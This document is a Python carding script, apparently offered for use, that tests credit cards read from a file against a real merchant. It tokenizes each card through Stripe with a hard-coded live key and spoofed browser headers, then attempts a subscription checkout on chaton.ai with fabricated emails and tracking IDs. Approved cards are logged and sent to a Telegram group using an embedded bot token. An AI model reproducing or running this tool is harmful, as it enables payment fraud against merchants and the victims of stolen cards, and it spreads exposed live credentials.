import requests
import random
import string
import telebot
from rich.console import Console
from rich.text import Text
from rich.panel import Panel
from rich import print as rprint
from rich.style import Style
import user_agent

console = Console()

TELEGRAM_BOT_TOKEN = '7545599113:AAGEdLMMVtNx0qdyVicGvnv-M9dIaCG8Biw'
TELEGRAM_GROUP_CHAT_ID = '-1002493556376'  # Replace with your group's chat ID

bot = telebot.TeleBot(TELEGRAM_BOT_TOKEN)

first_names = [
    "JAMES", "JOHN", "ROBERT", "MICHAEL", "WILLIAM", "DAVID", "RICHARD", "CHARLES",
    "JOSEPH", "THOMAS", "CHRISTOPHER", "DANIEL", "PAUL", "MARK", "DONALD", "GEORGE",
    "KENNETH", "STEVEN", "EDWARD", "BRIAN", "RONALD", "ANTHONY", "KEVIN", "JASON",
    "MATTHEW", "GARY", "TIMOTHY", "JOSE", "LARRY", "JEFFREY", "FRANK", "SCOTT", 
    "ERIC", "STEPHEN", "ANDREW", "RAYMOND", "GREGORY", "JOSHUA", "JERRY", "DENNIS",
    "WALTER", "PATRICK", "PETER", "HAROLD", "DOUGLAS", "HENRY", "CARL", "ARTHUR",
    "RYAN", "ROGER", "ALBERT", "KEITH", "SAMUEL", "RALPH", "LAWRENCE", "NICHOLAS",
    "ROY", "BENJAMIN", "BRUCE", "BRANDON", "ADAM", "HARRY", "FRED", "WAYNE", 
    "BILLY", "STEVE", "LOUIS", "JEREMY", "AARON", "RANDY", "HOWARD", "EUGENE", 
    "CARLOS", "RUSSELL", "BOBBY", "VICTOR", "MARTIN", "ERNEST", "PHILLIP", "TODD",
    "JESSE", "CRAIG", "ALAN", "SHAWN", "CLARENCE", "SEAN", "PHILIP", "CHRIS", 
    "JOHNNY", "EARL", "JIMMY", "ANTONIO", "DANNY", "BRYAN", "TONY", "LUIS", 
    "MIKE", "STANLEY", "LEONARD", "NATHAN", "DALE", "MANUEL", "RODNEY", "CURTIS",
    "NORMAN", "ALLEN", "MARVIN", "VINCENT", "GLENN", "JEFFERY", "TRAVIS", "JEFF"
]

last_names = [
    "SMITH", "JOHNSON", "WILLIAMS", "JONES", "BROWN", "DAVIS", "MILLER", "WILSON",
    "MOORE", "TAYLOR", "ANDERSON", "THOMAS", "JACKSON", "WHITE", "HARRIS", "MARTIN",
    "THOMPSON", "GARCIA", "MARTINEZ", "ROBINSON", "CLARK", "RODRIGUEZ", "LEWIS",
    "LEE", "WALKER", "HALL", "ALLEN", "YOUNG", "HERNANDEZ", "KING", "WRIGHT", 
    "LOPEZ", "HILL", "SCOTT", "GREEN", "ADAMS", "BAKER", "GONZALEZ", "NELSON",
    "CARTER", "MITCHELL", "PEREZ", "ROBERTS", "TURNER", "PHILLIPS", "CAMPBELL", 
    "PARKER", "EVANS", "EDWARDS", "COLLINS", "STEWART", "MORRIS", "MORGAN", 
    "COOPER", "RICHARDSON", "COX", "HOWARD", "WARD", "TORRES", "PETERSON", 
    "GREY", "RAMIREZ", "JAMES", "WATSON", "BROOKS", "KELLY", "SANDERS", 
    "PRICE", "BENNETT", "WOOD", "BARNES", "ROSS", "HENDERSON", "COLEMAN", 
    "JENKINS", "PERRY", "BUTLER", "FOSTER", "SIMMONS", "HUNTER", "GORDON",
    "MASON", "DIAZ", "REYES", "BURNS", "GORDON", "WELLS", "WILKINS"
]

def generate_random_name():
    first_name = random.choice(first_names)
    last_name = random.choice(last_names)
    return f"{first_name} {last_name}"

def generate_number():
    number = ''.join([str(random.randint(0, 9)) for _ in range(15)])
    return int(number)

def generate_fb_id():
    prefix = "fb.1."
    first_number = ''.join([str(random.randint(0, 9)) for _ in range(random.randint(13, 14))])
    second_number = ''.join([str(random.randint(0, 9)) for _ in range(18)])
    fb_id = prefix + first_number + '.' + second_number
    return fb_id

def generate_ten_digit_number():
    number = ''.join([str(random.randint(0, 9)) for _ in range(10)])
    return int(number)

def generate_two_part_number():
    first_part = ''.join([str(random.randint(0, 9)) for _ in range(9)])
    second_part = ''.join([str(random.randint(0, 9)) for _ in range(10)])
    generated_number = first_part + '.' + second_part
    return generated_number

def generate_complex_id():
    def random_hex_string(length):
        return ''.join(random.choice(string.hexdigits.lower()) for _ in range(length))
    part1 = random_hex_string(8)
    part2 = random_hex_string(4)
    part3 = random_hex_string(4)
    part4 = random_hex_string(4)
    part5 = random_hex_string(24)
    complex_id = f"{part1}-{part2}-{part3}-{part4}-{part5}"
    return complex_id

def generate_complex_id_with_extra():
    def random_hex_string(length):
        return ''.join(random.choice(string.hexdigits.lower()) for _ in range(length))
    part1 = random_hex_string(8)
    part2 = random_hex_string(4)
    part3 = random_hex_string(4)
    part4 = random_hex_string(4)
    part5 = random_hex_string(12)
    extra_part = random_hex_string(8)
    complex_id_with_extra = f"{part1}-{part2}-{part3}-{part4}-{part5}{extra_part}"
    return complex_id_with_extra

def generate_custom_id():
    def random_hex_string(length):
        return ''.join(random.choice(string.hexdigits.lower()) for _ in range(length))
    part1 = random_hex_string(8)
    part2 = random_hex_string(4)
    part3 = random_hex_string(4)
    part4 = random_hex_string(4)
    part5 = random_hex_string(12)
    extra_part = random_hex_string(7)
    custom_id = f"{part1}-{part2}-{part3}-{part4}-{part5}{extra_part}"
    return custom_id

def generate_64_hex_string():
    hex_string = ''.join(random.choice(string.hexdigits.upper()) for _ in range(64))
    return hex_string

def send_telegram_message(message):
    try:
        bot.send_message(TELEGRAM_GROUP_CHAT_ID, message, parse_mode='Markdown')
    except Exception as e:
        rprint(Panel(Text(f"Failed to send Telegram message: {e}", style="red"), title="Telegram Error"))

def generate_random_email():
    username = ''.join(random.choices(string.ascii_lowercase + string.digits, k=10))
    domain = random.choice(['gmail.com', 'yahoo.com', 'hotmail.com', 'outlook.com'])
    return f"{username}@{domain}"

def generate_random_user_id():
    return ''.join(random.choices(string.ascii_letters + string.digits, k=21))

def log_charge_result(message):
    with open('Approved.txt', 'a') as file:
        file.write(message + '\n')

def remove_decline_entries(file_path):
    with open(file_path, 'r') as file:
        lines = file.readlines()
    filtered_lines = [line for line in lines if 'Decline' not in line]
    with open(file_path, 'w') as file:
        file.writelines(filtered_lines)

#-----[UserAgent]-----#
user = user_agent.generate_user_agent()
banner = Text()
banner.append(" A͎y͎a͎s͎a͎ Stripe Approved \n", style=Style(color="green", bold=True))
banner.append("≿━━━━━━━༺❀༻━━━━━━━≾\n", style=Style(color="green", bold=True))
console.print(banner)

with open('cc.txt', 'r') as file:
    credit_cards = file.readlines()

for cc in credit_cards:
    cc_details = cc.strip().split('|')
    if len(cc_details) < 4:
        rprint(Panel(Text(f"Skipping invalid card details: {cc.strip()}", style="red"), title="Invalid Card"))
        continue

    num, mes, anu, cvv = cc_details
    email = generate_random_email()
    user_id = generate_random_user_id()

    stripe_url = 'https://api.stripe.com/v1/tokens'
    stripe_headers = {
        'authority': 'api.stripe.com',
        'accept': 'application/json',
        'accept-language': 'en-US,en;q=0.9',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://js.stripe.com',
        'referer': 'https://js.stripe.com/',
        'sec-ch-ua': '"Not_A Brand";v="99", "Google Chrome";v="109", "Chromium";v="109"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': user,
    }
    stripe_data = {
        'guid': generate_complex_id(),
        'muid': generate_complex_id_with_extra(),
        'sid': generate_custom_id(),
        'referrer': 'https://chaton.ai',
        'time_on_page': '416544',
        'card[name]': generate_random_name(),
        'card[number]': num,
        'card[cvc]': cvv,
        'card[exp_month]': mes,
        'card[exp_year]': anu,
        'payment_user_agent': 'stripe.js/883a2ae1fb; stripe-js-v3/883a2ae1fb; split-card-element',
        'pasted_fields': 'number',
        'key': 'pk_live_51OFuqbJI5eePoNHYcArch2y62M97lkY2aKMcQbz8dnPUI27KX31LELyGkhWUJG9Jo8cwVLdrXj07KQQ1YXm4Sqyv00iW4AshPu',
    }

    try:
        response = requests.post(stripe_url, headers=stripe_headers, data=stripe_data)
        response.raise_for_status()
        if response.status_code == 200:
            rprint(Panel(Text("Token extracted successfully", style="green"), title="Success"))
            token = response.json().get('id')

            chaton_url = 'https://pa.aiby.mobi/api/v1.0/chatonweb/checkout_card'
            chaton_headers = {
                'Accept': 'application/json, text/plain, */*',
                'Accept-Language': 'en-US,en;q=0.9',
                'Connection': 'keep-alive',
                'Content-Type': 'application/json',
                'Origin': 'https://chaton.ai',
                'Referer': 'https://chaton.ai/',
                'Sec-Fetch-Dest': 'empty',
                'Sec-Fetch-Mode': 'cors',
                'Sec-Fetch-Site': 'cross-site',
                'User-Agent': user,
                'sec-ch-ua': '"Not_A Brand";v="99", "Google Chrome";v="109", "Chromium";v="109"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
            }
            chaton_data = {
                "application": "chaton-web",
                "product_id": "prod_PVV6Gq8gidk9Qy",
                "email": email,
                "user_id": user_id,
                "token": token,
                "external_id": generate_64_hex_string(),
                "fbp": generate_fb_id(),
                "pixel_id": generate_number(),
                "ga_params": {
                    "session_id": generate_ten_digit_number(),
                    "client_id": generate_two_part_number()
                }
            }

            chaton_response = requests.post(chaton_url, headers=chaton_headers, json=chaton_data)
            chaton_response.raise_for_status()
            response_text = chaton_response.text
            customer_id = chaton_response.json().get("customer_id")
            subscription_id = chaton_response.json().get("subscription_id")

            if 'checkout_error' in response_text:
                result_message = f"{cc.strip()} - Your card was declined."
                rprint(Panel(Text(result_message, style="red"), title="Declined"))
                log_charge_result(result_message)
            elif customer_id and subscription_id:
                result_message = f"""
🛍️ 𝗔𝘆𝗮𝘀𝗮 𝗦𝘁𝗿𝗶𝗽𝗲 𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱 🛍️
𝗖𝗮𝗿𝗱 -» `{cc.strip()}`
𝗚𝗮𝘁𝗲𝘄𝗮𝘆 -» 𝗦𝗧𝗥𝗜𝗣𝗘
𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 -» 𝗖𝗩𝗩 ✅
𝗦𝗧𝗔𝗧𝗨𝗦 -» 𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱
𝗖𝗨𝗦𝗧𝗢𝗠𝗘𝗥 𝗜𝗗 -» {customer_id}
𝗦𝗨𝗕𝗦𝗖𝗥𝗜𝗣𝗧𝗜𝗢𝗡 𝗜𝗗 -» {subscription_id}
𝗕𝗬 : @Ayasa1299
"""
                rprint(Panel(Text(result_message, style="green"), title="Approved"))
                send_telegram_message(result_message)
                log_charge_result(result_message)
            else:
                result_message = f"{cc.strip()} - {response_text}"
                rprint(Panel(Text(result_message, style="yellow"), title="Response"))
                log_charge_result(result_message)

        else:
            result_message = "Token extraction failed."
            rprint(Panel(Text(result_message, style="red"), title="Error"))
            log_charge_result("Decline")
    except requests.exceptions.RequestException as e:
        result_message = f"An error occurred: {str(e)}"
        rprint(Panel(Text(result_message, style="red"), title="Error"))
        log_charge_result("Decline")

# Clean up Approved.txt by removing "Decline" entries
remove_decline_entries('Approved.txt')
